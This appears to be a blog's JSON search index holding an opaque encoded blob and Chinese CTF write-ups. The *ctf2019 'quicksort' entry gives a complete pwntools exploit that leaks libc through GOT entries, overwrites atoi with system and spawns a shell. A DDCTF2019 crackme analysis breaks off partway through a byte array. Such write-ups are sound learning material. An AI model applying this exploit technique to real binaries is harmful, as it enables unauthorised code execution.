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","categories":[],"tags":[]},{"title":"*ctf2019-quicksort","slug":"ctf2019-quicksort","date":"2019-05-04T13:18:55.000Z","updated":"2019-05-04T13:38:21.924Z","comments":true,"path":"2019/05/04/ctf2019-quicksort/","link":"","permalink":"http://yoursite.com/2019/05/04/ctf2019-quicksort/","excerpt":"leak基址+覆写GOT表","text":"leak基址+覆写GOT表 简单分析 在输入数字时，能够通过溢出覆盖ptr指针和控制i的大小。IDA分析发现，free_got在gets_got的后面，把ptr覆盖成gets_got的地址，i修改成1，这样实际上就把free_got修改成了main函数地址，并且由于并且对gets_got进行修改，排序完输出时就leak出来gets_got，得到了libc基址，再把atoi_got修改成system，之后输入/bin/sh即可获取shell。 leak出的地址是负数，自作聪明+0x100000000强行转成了正数，结果就是一直没做出来。赛后看了dalao们的wp才发现不需要这样做orz EXP1#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * main=0x080489C9 sh = process(&apos;./quicksort/quicksort&apos;) #sh = remote(&apos;34.92.96.238&apos;,10000) elf= ELF(&apos;./quicksort/quicksort&apos;) libc= ELF(&apos;./quicksort/libc.so.6&apos;) gets_got=elf.got[&apos;gets&apos;] atoi_got=elf.got[&apos;atoi&apos;] gets=libc.symbols[&apos;gets&apos;] system=libc.symbols[&apos;system&apos;] sh.recvuntil(&apos;sort?\\n&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;number:&apos;) sh.sendline(str(main)+&apos;\\x00&apos;*7+p32(1)*3+p32(gets_got)) sh.recvuntil(&apos;result:\\n&apos;) leak=int(sh.recvline()) libcbase=leak-gets sh.recvuntil(&apos;sort?\\n&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;number:&apos;) sh.sendline(str(libcbase+system)+&apos;\\x00&apos;*6+p32(2)+p32(0)*2+p32(atoi_got)) sh.recvuntil(&apos;number:&apos;) sh.sendline(&apos;/bin/sh\\x00&apos;) sh.interactive()","categories":[],"tags":[]},{"title":"DDCTF2019-Confused","slug":"DDCTF2019-Confused","date":"2019-04-19T12:20:38.000Z","updated":"2019-04-19T12:21:05.591Z","comments":true,"path":"2019/04/19/DDCTF2019-Confused/","link":"","permalink":"http://yoursite.com/2019/04/19/DDCTF2019-Confused/","excerpt":"题目文件为一个osx的app，打开包内容可以发现Contents/MacOS里有一个xia0Crackme，很明显是要对这个文件进行分析。","text":"题目文件为一个osx的app，打开包内容可以发现Contents/MacOS里有一个xia0Crackme，很明显是要对这个文件进行分析。 IDA打开，定位到checkcode函数，对输入进行约束，前缀为DDCTF{，结尾为}，中间部分长度为18，另外进入check函数。 经过分析，程序会根据下面的数组对输入进行校验。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374[0xf0,0x10,0x66,0x0,0x0,0x0,0xf8,0xf2,0x30,0xf6,0xc1,0xf0,0x10,0x63,0x0,0x0,0x0,0xf8,0xf2,0x31,0xf6,0xb6,0xf0,0x10,0x6a,0x0,0x0,0x0,0xf8,0xf2,0x32,0xf6,0xab,0xf0,0x10,0x6a,0x0,0x0,0x0,0xf8,0xf2,0x33,0xf6,0xa0,0xf0,0x10,0x6d,0x0,0x0,0x0,0xf8,0xf2,0x34,0xf6,0x95,0xf0,0x10,0x57,0x0,0x0,0x0,0xf8,0xf2,0x35,0xf6,0x8a,0xf0,0x10,0x6d,0x0,0x0,0x0,0xf8,0xf2,0x36,0xf6,0x7f,0xf0,0x10,0x73,0x0,0x0,0x0,0xf8,0xf2,0x37,0xf6,0x74,0xf0,0x10,0x45,0x0,0x0,0x0,0xf8,0xf2,0x38,0xf6,0x69,0xf0,0x10,0x6d,0x0,0x0,0x0,0xf8,0xf2,0x39,0xf6,0x5e,0xf0,0x10,0x72,0x0,0x0,0x0,0xf8,0xf2,0x3a,0xf6,0x53,0xf0,0x10,0x52,0x0,0x0,0x0,0xf8,0xf2,0x3b,0xf6,0x48,0xf0,0x10,0x66,0x0,0x0,0x0,0xf8,0xf2,0x3c,